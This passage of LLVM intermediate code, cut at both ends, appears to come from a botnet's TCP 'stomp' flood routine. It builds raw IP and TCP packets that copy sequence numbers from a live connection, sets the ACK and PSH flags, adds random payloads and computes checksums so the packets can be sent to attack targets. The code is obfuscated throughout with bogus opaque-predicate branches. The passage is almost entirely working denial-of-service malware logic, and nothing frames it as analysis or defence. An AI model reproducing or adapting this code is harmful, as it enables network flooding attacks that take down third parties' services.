  %345 = zext i16 %344 to i32
  %346 = icmp eq i32 %342, %345
  %347 = load i32, i32* @x.29
  %348 = load i32, i32* @y.30
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %346, label %355, label %689

; <label>:355:                                    ; preds = %originalBBpart240
  %356 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %357 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %356, i32 0, i32 4
  %358 = load i16, i16* %357, align 4
  %359 = lshr i16 %358, 9
  %360 = and i16 %359, 1
  %361 = zext i16 %360 to i32
  %362 = icmp ne i32 %361, 0
  br i1 %362, label %363, label %604

; <label>:363:                                    ; preds = %355
  %364 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %365 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %364, i32 0, i32 4
  %366 = load i16, i16* %365, align 4
  %367 = lshr i16 %366, 12
  %368 = and i16 %367, 1
  %369 = zext i16 %368 to i32
  %370 = icmp ne i32 %369, 0
  br i1 %370, label %371, label %604

; <label>:371:                                    ; preds = %363
  %372 = load i32, i32* @x.29
  %373 = load i32, i32* @y.30
  %374 = sub i32 %372, 1
  %375 = mul i32 %372, %374
  %376 = urem i32 %375, 2
  %377 = icmp eq i32 %376, 0
  %378 = icmp slt i32 %373, 10
  %379 = or i1 %377, %378
  br i1 %379, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %371
  %380 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %381 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %380, i32 0, i32 0
  %382 = load i32, i32* %381, align 4
  %383 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %384 = load i32, i32* %9, align 4
  %385 = sext i32 %384 to i64
  %386 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %383, i64 %385
  %387 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %386, i32 0, i32 0
  store i32 %382, i32* %387, align 4
  %388 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 2
  %390 = load i32, i32* %389, align 4
  %391 = call i32 @ntohl(i32 %390) #7
  %392 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %393 = load i32, i32* %9, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %392, i64 %394
  %396 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %395, i32 0, i32 1
  store i32 %391, i32* %396, align 4
  %397 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %398 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %397, i32 0, i32 3
  %399 = load i32, i32* %398, align 4
  %400 = call i32 @ntohl(i32 %399) #7
  %401 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %402 = load i32, i32* %9, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %401, i64 %403
  %405 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %404, i32 0, i32 2
  store i32 %400, i32* %405, align 4
  %406 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 1
  %408 = load i16, i16* %407, align 2
  %409 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %410 = load i32, i32* %9, align 4
  %411 = sext i32 %410 to i64
  %412 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %409, i64 %411
  %413 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %412, i32 0, i32 3
  store i16 %408, i16* %413, align 4
  %414 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %415 = load i16, i16* %414, align 2
  %416 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %417 = load i32, i32* %9, align 4
  %418 = sext i32 %417 to i64
  %419 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %416, i64 %418
  %420 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %419, i32 0, i32 4
  store i16 %415, i16* %420, align 2
  %421 = load i32, i32* %24, align 4
  %422 = sext i32 %421 to i64
  %423 = add i64 40, %422
  %424 = call noalias i8* @malloc(i64 %423) #6
  %425 = load i8**, i8*** %12, align 8
  %426 = load i32, i32* %9, align 4
  %427 = sext i32 %426 to i64
  %428 = getelementptr inbounds i8*, i8** %425, i64 %427
  store i8* %424, i8** %428, align 8
  %429 = load i8**, i8*** %12, align 8
  %430 = load i32, i32* %9, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds i8*, i8** %429, i64 %431
  %433 = load i8*, i8** %432, align 8
  %434 = bitcast i8* %433 to %struct.iphdr*
  store %struct.iphdr* %434, %struct.iphdr** %36, align 8
  %435 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %436 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %435, i64 1
  %437 = bitcast %struct.iphdr* %436 to %struct.tcphdr*
  store %struct.tcphdr* %437, %struct.tcphdr** %37, align 8
  %438 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %439 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %438, i64 1
  %440 = bitcast %struct.tcphdr* %439 to i8*
  store i8* %440, i8** %38, align 8
  %441 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %442 = bitcast %struct.iphdr* %441 to i8*
  %443 = load i8, i8* %442, align 4
  %444 = and i8 %443, 15
  %445 = or i8 %444, 64
  store i8 %445, i8* %442, align 4
  %446 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %447 = bitcast %struct.iphdr* %446 to i8*
  %448 = load i8, i8* %447, align 4
  %449 = and i8 %448, -16
  %450 = or i8 %449, 5
  store i8 %450, i8* %447, align 4
  %451 = load i8, i8* %13, align 1
  %452 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %453 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %452, i32 0, i32 1
  store i8 %451, i8* %453, align 1
  %454 = load i32, i32* %24, align 4
  %455 = sext i32 %454 to i64
  %456 = add i64 40, %455
  %457 = trunc i64 %456 to i16
  %458 = call zeroext i16 @htons(i16 zeroext %457) #7
  %459 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %460 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %459, i32 0, i32 2
  store i16 %458, i16* %460, align 2
  %461 = load i16, i16* %14, align 2
  %462 = call zeroext i16 @htons(i16 zeroext %461) #7
  %463 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %464 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %463, i32 0, i32 3
  store i16 %462, i16* %464, align 4
  %465 = load i8, i8* %15, align 1
  %466 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %467 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %466, i32 0, i32 5
  store i8 %465, i8* %467, align 4
  %468 = load i8, i8* %16, align 1
  %469 = icmp ne i8 %468, 0
  %470 = load i32, i32* @x.29
  %471 = load i32, i32* @y.30
  %472 = sub i32 %470, 1
  %473 = mul i32 %470, %472
  %474 = urem i32 %473, 2
  %475 = icmp eq i32 %474, 0
  %476 = icmp slt i32 %471, 10
  %477 = or i1 %475, %476
  br i1 %477, label %originalBBpart283, label %originalBB42alteredBB

originalBBpart283:                                ; preds = %originalBB42
  br i1 %469, label %478, label %482

; <label>:478:                                    ; preds = %originalBBpart283
  %479 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %480 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %481 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %480, i32 0, i32 4
  store i16 %479, i16* %481, align 2
  br label %482

; <label>:482:                                    ; preds = %478, %originalBBpart283
  %483 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %484 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %483, i32 0, i32 6
  store i8 6, i8* %484, align 1
  %485 = load i32, i32* @LOCAL_ADDR, align 4
  %486 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %487 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %486, i32 0, i32 8
  store i32 %485, i32* %487, align 4
  %488 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %489 = load i32, i32* %9, align 4
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %488, i64 %490
  %492 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %491, i32 0, i32 0
  %493 = load i32, i32* %492, align 4
  %494 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %495 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %494, i32 0, i32 9
  store i32 %493, i32* %495, align 4
  %496 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %497 = load i32, i32* %9, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %496, i64 %498
  %500 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %499, i32 0, i32 3
  %501 = load i16, i16* %500, align 4
  %502 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %503 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %502, i32 0, i32 0
  store i16 %501, i16* %503, align 4
  %504 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %505 = load i32, i32* %9, align 4
  %506 = sext i32 %505 to i64
  %507 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %504, i64 %506
  %508 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %507, i32 0, i32 4
  %509 = load i16, i16* %508, align 2
  %510 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %511 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %510, i32 0, i32 1
  store i16 %509, i16* %511, align 2
  %512 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %513 = load i32, i32* %9, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %512, i64 %514
  %516 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %515, i32 0, i32 2
  %517 = load i32, i32* %516, align 4
  %518 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %519 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %518, i32 0, i32 2
  store i32 %517, i32* %519, align 4
  %520 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %521 = load i32, i32* %9, align 4
  %522 = sext i32 %521 to i64
  %523 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %520, i64 %522
  %524 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %523, i32 0, i32 1
  %525 = load i32, i32* %524, align 4
  %526 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %527 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %526, i32 0, i32 3
  store i32 %525, i32* %527, align 4
  %528 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %529 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %528, i32 0, i32 4
  %530 = load i16, i16* %529, align 4
  %531 = and i16 %530, -241
  %532 = or i16 %531, 128
  store i16 %532, i16* %529, align 4
  %533 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %534 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %533, i32 0, i32 4
  %535 = load i16, i16* %534, align 4
  %536 = and i16 %535, -257
  %537 = or i16 %536, 256
  store i16 %537, i16* %534, align 4
  %538 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %539 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %538, i32 0, i32 4
  %540 = load i16, i16* %539, align 4
  %541 = and i16 %540, -4097
  %542 = or i16 %541, 4096
  store i16 %542, i16* %539, align 4
  %543 = call i32 @rand_next()
  %544 = and i32 %543, 65535
  %545 = trunc i32 %544 to i16
  %546 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %547 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %546, i32 0, i32 5
  store i16 %545, i16* %547, align 2
  %548 = load i8, i8* %18, align 1
  %549 = sext i8 %548 to i16
  %550 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %551 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %550, i32 0, i32 4
  %552 = load i16, i16* %551, align 4
  %553 = and i16 %549, 1
  %554 = shl i16 %553, 13
  %555 = and i16 %552, -8193
  %556 = or i16 %555, %554
  store i16 %556, i16* %551, align 4
  %557 = load i8, i8* %19, align 1
  %558 = sext i8 %557 to i16
  %559 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %560 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %559, i32 0, i32 4
  %561 = load i16, i16* %560, align 4
  %562 = and i16 %558, 1
  %563 = shl i16 %562, 12
  %564 = and i16 %561, -4097
  %565 = or i16 %564, %563
  store i16 %565, i16* %560, align 4
  %566 = load i8, i8* %20, align 1
  %567 = sext i8 %566 to i16
  %568 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %569 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %568, i32 0, i32 4
  %570 = load i16, i16* %569, align 4
  %571 = and i16 %567, 1
  %572 = shl i16 %571, 11
  %573 = and i16 %570, -2049
  %574 = or i16 %573, %572
  store i16 %574, i16* %569, align 4
  %575 = load i8, i8* %21, align 1
  %576 = sext i8 %575 to i16
  %577 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %578 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %577, i32 0, i32 4
  %579 = load i16, i16* %578, align 4
  %580 = and i16 %576, 1
  %581 = shl i16 %580, 10
  %582 = and i16 %579, -1025
  %583 = or i16 %582, %581
  store i16 %583, i16* %578, align 4
  %584 = load i8, i8* %22, align 1
  %585 = sext i8 %584 to i16
  %586 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %587 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %586, i32 0, i32 4
  %588 = load i16, i16* %587, align 4
  %589 = and i16 %585, 1
  %590 = shl i16 %589, 9
  %591 = and i16 %588, -513
  %592 = or i16 %591, %590
  store i16 %592, i16* %587, align 4
  %593 = load i8, i8* %23, align 1
  %594 = sext i8 %593 to i16
  %595 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %596 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %595, i32 0, i32 4
  %597 = load i16, i16* %596, align 4
  %598 = and i16 %594, 1
  %599 = shl i16 %598, 8
  %600 = and i16 %597, -257
  %601 = or i16 %600, %599
  store i16 %601, i16* %596, align 4
  %602 = load i8*, i8** %38, align 8
  %603 = load i32, i32* %24, align 4
  call void @rand_str(i8* %602, i32 %603)
  br label %699

; <label>:604:                                    ; preds = %363, %355
  %605 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %606 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %605, i32 0, i32 4
  %607 = load i16, i16* %606, align 4
  %608 = lshr i16 %607, 8
  %609 = and i16 %608, 1
  %610 = zext i16 %609 to i32
  %611 = icmp ne i32 %610, 0
  br i1 %611, label %636, label %612

; <label>:612:                                    ; preds = %604
  %613 = load i32, i32* @x.29
  %614 = load i32, i32* @y.30
  %615 = sub i32 %613, 1
  %616 = mul i32 %613, %615
  %617 = urem i32 %616, 2
  %618 = icmp eq i32 %617, 0
  %619 = icmp slt i32 %614, 10
  %620 = or i1 %618, %619
  br i1 %620, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %612
  %621 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %622 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %621, i32 0, i32 4
  %623 = load i16, i16* %622, align 4
  %624 = lshr i16 %623, 10
  %625 = and i16 %624, 1
  %626 = zext i16 %625 to i32
  %627 = icmp ne i32 %626, 0
  %628 = load i32, i32* @x.29
  %629 = load i32, i32* @y.30
  %630 = sub i32 %628, 1
  %631 = mul i32 %628, %630
  %632 = urem i32 %631, 2
  %633 = icmp eq i32 %632, 0
  %634 = icmp slt i32 %629, 10
  %635 = or i1 %633, %634
  br i1 %635, label %originalBBpart2110, label %originalBB85alteredBB

originalBBpart2110:                               ; preds = %originalBB85
  br i1 %627, label %636, label %655

; <label>:636:                                    ; preds = %originalBBpart2110, %604
  %637 = load i32, i32* @x.29
  %638 = load i32, i32* @y.30
  %639 = sub i32 %637, 1
  %640 = mul i32 %637, %639
  %641 = urem i32 %640, 2
  %642 = icmp eq i32 %641, 0
  %643 = icmp slt i32 %638, 10
  %644 = or i1 %642, %643
  br i1 %644, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %636
  %645 = load i32, i32* %26, align 4
  %646 = call i32 @close(i32 %645)
  %647 = load i32, i32* @x.29
  %648 = load i32, i32* @y.30
  %649 = sub i32 %647, 1
  %650 = mul i32 %647, %649
  %651 = urem i32 %650, 2
  %652 = icmp eq i32 %651, 0
  %653 = icmp slt i32 %648, 10
  %654 = or i1 %652, %653
  br i1 %654, label %originalBBpart2114, label %originalBB112alteredBB

originalBBpart2114:                               ; preds = %originalBB112
  br label %137

; <label>:655:                                    ; preds = %originalBBpart2110
  %656 = load i32, i32* @x.29
  %657 = load i32, i32* @y.30
  %658 = sub i32 %656, 1
  %659 = mul i32 %656, %658
  %660 = urem i32 %659, 2
  %661 = icmp eq i32 %660, 0
  %662 = icmp slt i32 %657, 10
  %663 = or i1 %661, %662
  br i1 %663, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %655
  %664 = load i32, i32* @x.29
  %665 = load i32, i32* @y.30
  %666 = sub i32 %664, 1
  %667 = mul i32 %664, %666
  %668 = urem i32 %667, 2
  %669 = icmp eq i32 %668, 0
  %670 = icmp slt i32 %665, 10
  %671 = or i1 %669, %670
  br i1 %671, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br label %672

; <label>:672:                                    ; preds = %originalBBpart2118
  %673 = load i32, i32* @x.29
  %674 = load i32, i32* @y.30
  %675 = sub i32 %673, 1
  %676 = mul i32 %673, %675
  %677 = urem i32 %676, 2
  %678 = icmp eq i32 %677, 0
  %679 = icmp slt i32 %674, 10
  %680 = or i1 %678, %679
  br i1 %680, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %672
  %681 = load i32, i32* @x.29
  %682 = load i32, i32* @y.30
  %683 = sub i32 %681, 1
  %684 = mul i32 %681, %683
  %685 = urem i32 %684, 2
  %686 = icmp eq i32 %685, 0
  %687 = icmp slt i32 %682, 10
  %688 = or i1 %686, %687
  br i1 %688, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br label %689

; <label>:689:                                    ; preds = %originalBBpart2122, %originalBBpart240
  br label %690

; <label>:690:                                    ; preds = %689, %originalBBpart236, %originalBBpart232
  %691 = call i64 @time(i64* null) #6
  %692 = load i64, i64* %31, align 8
  %693 = sub nsw i64 %691, %692
  %694 = icmp sgt i64 %693, 10
  br i1 %694, label %695, label %698

; <label>:695:                                    ; preds = %690
  %696 = load i32, i32* %26, align 4
  %697 = call i32 @close(i32 %696)
  br label %137

; <label>:698:                                    ; preds = %690
  br label %255

; <label>:699:                                    ; preds = %482
  %700 = load i32, i32* @x.29
  %701 = load i32, i32* @y.30
  %702 = sub i32 %700, 1
  %703 = mul i32 %700, %702
  %704 = urem i32 %703, 2
  %705 = icmp eq i32 %704, 0
  %706 = icmp slt i32 %701, 10
  %707 = or i1 %705, %706
  br i1 %707, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %699
  %708 = load i32, i32* @x.29
  %709 = load i32, i32* @y.30
  %710 = sub i32 %708, 1
  %711 = mul i32 %708, %710
  %712 = urem i32 %711, 2
  %713 = icmp eq i32 %712, 0
  %714 = icmp slt i32 %709, 10
  %715 = or i1 %713, %714
  br i1 %715, label %originalBBpart2126, label %originalBB124alteredBB

originalBBpart2126:                               ; preds = %originalBB124
  br label %716

; <label>:716:                                    ; preds = %originalBBpart2126, %originalBBpart28
  %717 = load i32, i32* %9, align 4
  %718 = add nsw i32 %717, 1
  store i32 %718, i32* %9, align 4
  br label %131

; <label>:719:                                    ; preds = %131
  %720 = load i32, i32* @x.29
  %721 = load i32, i32* @y.30
  %722 = sub i32 %720, 1
  %723 = mul i32 %720, %722
  %724 = urem i32 %723, 2
  %725 = icmp eq i32 %724, 0
  %726 = icmp slt i32 %721, 10
  %727 = or i1 %725, %726
  br i1 %727, label %originalBB128, label %originalBB128alteredBB

originalBB128:                                    ; preds = %originalBB128alteredBB, %719
  %728 = load i32, i32* @x.29
  %729 = load i32, i32* @y.30
  %730 = sub i32 %728, 1
  %731 = mul i32 %728, %730
  %732 = urem i32 %731, 2
  %733 = icmp eq i32 %732, 0
  %734 = icmp slt i32 %729, 10
  %735 = or i1 %733, %734
  br i1 %735, label %originalBBpart2130, label %originalBB128alteredBB

originalBBpart2130:                               ; preds = %originalBB128
  br label %736

; <label>:736:                                    ; preds = %894, %originalBBpart2130
  %737 = load i32, i32* @x.29
  %738 = load i32, i32* @y.30
  %739 = sub i32 %737, 1
  %740 = mul i32 %737, %739
  %741 = urem i32 %740, 2
  %742 = icmp eq i32 %741, 0
  %743 = icmp slt i32 %738, 10
  %744 = or i1 %742, %743
  br i1 %744, label %originalBB132, label %originalBB132alteredBB

originalBB132:                                    ; preds = %originalBB132alteredBB, %736
  store i32 0, i32* %9, align 4
  %745 = load i32, i32* @x.29
  %746 = load i32, i32* @y.30
  %747 = sub i32 %745, 1
  %748 = mul i32 %745, %747
  %749 = urem i32 %748, 2
  %750 = icmp eq i32 %749, 0
  %751 = icmp slt i32 %746, 10
  %752 = or i1 %750, %751
  br i1 %752, label %originalBBpart2134, label %originalBB132alteredBB

originalBBpart2134:                               ; preds = %originalBB132
  br label %753

; <label>:753:                                    ; preds = %originalBBpart2150, %originalBBpart2134
  %754 = load i32, i32* @x.29
  %755 = load i32, i32* @y.30
  %756 = sub i32 %754, 1
  %757 = mul i32 %754, %756
  %758 = urem i32 %757, 2
  %759 = icmp eq i32 %758, 0
  %760 = icmp slt i32 %755, 10
  %761 = or i1 %759, %760
  br i1 %761, label %originalBB136, label %originalBB136alteredBB

originalBB136:                                    ; preds = %originalBB136alteredBB, %753
  %762 = load i32, i32* %9, align 4
  %763 = load i8, i8* %5, align 1
  %764 = zext i8 %763 to i32
  %765 = icmp slt i32 %762, %764
  %766 = load i32, i32* @x.29
  %767 = load i32, i32* @y.30
  %768 = sub i32 %766, 1
  %769 = mul i32 %766, %768
  %770 = urem i32 %769, 2
  %771 = icmp eq i32 %770, 0
  %772 = icmp slt i32 %767, 10
  %773 = or i1 %771, %772
  br i1 %773, label %originalBBpart2138, label %originalBB136alteredBB

originalBBpart2138:                               ; preds = %originalBB136
  br i1 %765, label %774, label %894

; <label>:774:                                    ; preds = %originalBBpart2138
  %775 = load i8**, i8*** %12, align 8
  %776 = load i32, i32* %9, align 4
  %777 = sext i32 %776 to i64
  %778 = getelementptr inbounds i8*, i8** %775, i64 %777
  %779 = load i8*, i8** %778, align 8
  store i8* %779, i8** %39, align 8
  %780 = load i8*, i8** %39, align 8
  %781 = bitcast i8* %780 to %struct.iphdr*
  store %struct.iphdr* %781, %struct.iphdr** %40, align 8
  %782 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %783 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %782, i64 1
  %784 = bitcast %struct.iphdr* %783 to %struct.tcphdr*
  store %struct.tcphdr* %784, %struct.tcphdr** %41, align 8
  %785 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %786 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %785, i64 1
  %787 = bitcast %struct.tcphdr* %786 to i8*
  store i8* %787, i8** %42, align 8
  %788 = load i16, i16* %14, align 2
  %789 = zext i16 %788 to i32
  %790 = icmp eq i32 %789, 65535
  br i1 %790, label %791, label %797

; <label>:791:                                    ; preds = %774
  %792 = call i32 @rand_next()
  %793 = and i32 %792, 65535
  %794 = trunc i32 %793 to i16
  %795 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %796 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %795, i32 0, i32 3
  store i16 %794, i16* %796, align 4
  br label %797

; <label>:797:                                    ; preds = %791, %774
  %798 = load i8, i8* %25, align 1
  %799 = icmp ne i8 %798, 0
  br i1 %799, label %800, label %803

; <label>:800:                                    ; preds = %797
  %801 = load i8*, i8** %42, align 8
  %802 = load i32, i32* %24, align 4
  call void @rand_str(i8* %801, i32 %802)
  br label %803

; <label>:803:                                    ; preds = %800, %797
  %804 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %805 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %804, i32 0, i32 7
  store i16 0, i16* %805, align 2
  %806 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %807 = bitcast %struct.iphdr* %806 to i16*
  %808 = call zeroext i16 @checksum_generic(i16* %807, i32 20)
  %809 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %810 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %809, i32 0, i32 7
  store i16 %808, i16* %810, align 2
  %811 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %812 = load i32, i32* %9, align 4
  %813 = sext i32 %812 to i64
  %814 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %811, i64 %813
  %815 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %814, i32 0, i32 1
  %816 = load i32, i32* %815, align 4
  %817 = add i32 %816, 1
  store i32 %817, i32* %815, align 4
  %818 = trunc i32 %816 to i16
  %819 = call zeroext i16 @htons(i16 zeroext %818) #7
  %820 = zext i16 %819 to i32
  %821 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %822 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %821, i32 0, i32 2
  store i32 %820, i32* %822, align 4
  %823 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %824 = load i32, i32* %9, align 4
  %825 = sext i32 %824 to i64
  %826 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %823, i64 %825
  %827 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %826, i32 0, i32 2
  %828 = load i32, i32* %827, align 4
  %829 = trunc i32 %828 to i16
  %830 = call zeroext i16 @htons(i16 zeroext %829) #7
  %831 = zext i16 %830 to i32
  %832 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %833 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %832, i32 0, i32 3
  store i32 %831, i32* %833, align 4
  %834 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %835 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %834, i32 0, i32 6
  store i16 0, i16* %835, align 4
  %836 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %837 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %838 = bitcast %struct.tcphdr* %837 to i8*
  %839 = load i32, i32* %24, align 4
  %840 = sext i32 %839 to i64
  %841 = add i64 20, %840
  %842 = trunc i64 %841 to i16
  %843 = call zeroext i16 @htons(i16 zeroext %842) #7
  %844 = load i32, i32* %24, align 4
  %845 = sext i32 %844 to i64
  %846 = add i64 20, %845
  %847 = trunc i64 %846 to i32
  %848 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %836, i8* %838, i16 zeroext %843, i32 %847)
  %849 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %850 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %849, i32 0, i32 6
  store i16 %848, i16* %850, align 4
  %851 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %852 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %851, i32 0, i32 1
  %853 = load i16, i16* %852, align 2
  %854 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %855 = load i32, i32* %9, align 4
  %856 = sext i32 %855 to i64
  %857 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %854, i64 %856
  %858 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %857, i32 0, i32 0
  %859 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %858, i32 0, i32 1
  store i16 %853, i16* %859, align 2
  %860 = load i32, i32* %10, align 4
  %861 = load i8*, i8** %39, align 8
  %862 = load i32, i32* %24, align 4
  %863 = sext i32 %862 to i64
  %864 = add i64 40, %863
  %865 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %866 = load %struct.attack_target*, %struct.attack_target** %6, align 8
